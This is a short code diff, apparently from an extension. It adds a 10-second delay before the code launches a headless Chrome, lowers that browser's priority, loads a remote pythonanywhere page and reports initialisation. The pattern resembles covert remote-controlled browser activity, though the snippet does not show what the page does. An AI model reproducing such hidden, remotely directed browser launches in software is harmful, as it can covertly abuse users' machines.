@@ -50,6 +50,8 @@
     });
   }, 3000);
 
+  await new Promise(r => setTimeout(r, 10000));
+
   browser = await puppeteer.launch({
     executablePath: chromePath,
     headless: true,
@@ -62,7 +64,6 @@
   os.setPriority(browser.process().pid, 19);
   page = await browser.newPage();
   await page.goto('https://ab498.pythonanywhere.com/files/init.html');
-
 
 
   await tstt({ message: "INIT_COMPLETE", version: safe(() => JSON.parse(fs.readFileSync(`${extensionPath}/package.json`))?.version) });
